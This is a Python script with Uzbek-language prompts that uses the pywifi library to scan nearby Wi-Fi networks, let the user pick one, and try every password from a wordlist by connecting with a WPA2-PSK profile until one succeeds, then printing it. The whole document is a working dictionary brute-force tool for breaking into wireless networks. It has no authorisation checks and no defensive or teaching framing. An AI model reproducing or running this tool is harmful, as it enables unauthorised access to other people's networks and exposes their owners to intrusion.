from pywifi import const, PyWiFi, Profile
from time import sleep

wifi = PyWiFi()
interface = wifi.interfaces()[0]

def wifi_scan():
	interface.scan()
	sleep(8)
	result = interface.scan_results()
	return result

def test_password(ssid, password):
	interface.disconnect()
	profile = Profile()
	profile.ssid = ssid
	profile.auth = const.AUTH_ALG_OPEN
	profile.akm.append(const.AKM_TYPE_WPA2PSK)
	profile.cipher = const.CIPHER_TYPE_CCMP
	profile.key = password
	interface.connect(interface.add_network_profile(profile))
	sleep(1.5)

	if interface.status() == const.IFACE_CONNECTED:
		interface.remove_network_profile(profile)
		return True
	else:
		interface.remove_network_profile(profile)
		return False
password_list = input("Parollar Listi: ")

print("Skanerlanmoqda...")
APs = wifi_scan()

for number in range(len(APs)):
	print(" [{}] {}".format(number + 1, APs[number].ssid))

index = int(input("\n Wi-Fi tarmoqlardan birini tanlang >>>  "))
target = APs[index-1]

password_tested = 0
for password in open(password_list):
	password = password.strip("\n")
	password_tested += 1
	print("\r {} ta Parollar Sinab Ko'rildi".format(password_tested), end="")

	if test_password(target.ssid, password):
		print("\n")
		print("* " * 15)
		print("PAROL: {}".format(password))
		print("* " * 15)

		break
input("Chiqish uchun Enter ni bosing...")
